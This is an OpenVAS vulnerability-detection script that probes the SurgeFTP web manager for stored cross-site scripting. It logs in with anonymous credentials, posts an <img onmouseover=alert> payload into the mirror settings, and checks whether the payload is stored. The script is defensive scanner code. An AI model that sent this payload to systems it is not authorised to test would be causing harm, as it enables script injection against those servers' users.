###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_surgeftp_web_intr_stored_xss_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Surgeftp Web Interface Multiple Stored XSS Vulnerabilities
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806805");
  script_version("$Revision: 11872 $");
  script_tag(name:"cvss_base", value:"3.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-12-18 09:54:55 +0530 (Fri, 18 Dec 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Surgeftp Web Interface Multiple Stored XSS Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Netwin SurgeFTP
 Server and is prone to multiple stored XSS vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST method
 and check whether it is able to execute script or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to insufficient
 validation of user supplied input while adding new 'mirrors' and new
 'domains'");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
 attacker to create a specially crafted request that would execute arbitrary
 script code in a user's browser session within the trust relationship between
 their browser and the server.");

  script_tag(name:"affected", value:"SurgeFTP 23d6");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/38762/");
  script_xref(name:"URL", value:"http://netwinsite.com/surgeftp/updates.htm");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 7021);
  script_mandatory_keys("surgeftp/banner");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("misc_func.inc");
include("http_keepalive.inc");

surg_port = get_http_port(default:7021);

banner = get_http_banner(port:surg_port);

if('Basic realm="surgeftp' >!< banner){
  exit(0);
}

auth = base64(str:'anonymous:anonymous');

host= http_host_name(port:surg_port);

url = "/cgi/surgeftpmgr.cgi";

postData ='mirrorid=-1&mirror_ssl=TRUE&lcl=%3Cimg+src%3Dx+onmouseover%3Dalert%2'+
          '8%22XSS-TEST1%22%29%3E&remote_host=%3Cimg+src%3Dx+onmouseover%3Dalert%28%22XSS'+
          '-TEST1%22%29%3E&remote_path=%2Fpub%2Fxxxx&use_full_path_local=TRUE&files=*.zip'+
          '%2C*.tar.Z&xdelay=1440&user=anonymous&pass=secpod%40secpod123&cmd_mirror_save.'+
          'x=23&cmd_mirror_save.y=16';
len = strlen(postData );

sndReq1 ='POST ' + url + ' HTTP/1.1\r\n' +
         'Host: ' + host + '\r\n' +
         'Authorization: Basic ' + auth + '\r\n' +
         'Content-Type: application/x-www-form-urlencoded\r\n' +
         'Content-Length: ' + len + '\r\n' +
         '\r\n' +
         postData;

rcvRes1 = http_keepalive_send_recv(port:surg_port, data:sndReq1);
if(rcvRes1 =~ "HTTP/1\.[0-9]+ 200 OK" && ">Mirror settings <" ><rcvRes1)
{
  sndReq2 = 'GET /cgi/surgeftpmgr.cgi?cmd=mirrors HTTP/1.1\r\n' +
            'Host: ' + host + '\r\n' +
            'Authorization: Basic ' + auth + '\r\n' +
            '\r\n';
  rcvRes2 = http_keepalive_send_recv(port:surg_port, data:sndReq2);

  if(rcvRes2 =~ "HTTP/1\.[0-9]+ 200 OK" &&
    '><img src=x onmouseover=alert("XSS-TEST1")' >< rcvRes2 &&
    ">Mirrors<" >< rcvRes2)
  {
    report = report_vuln_url( port:surg_port, url:url );
    security_message(port:surg_port, data:report);
    exit(0);
  }
}
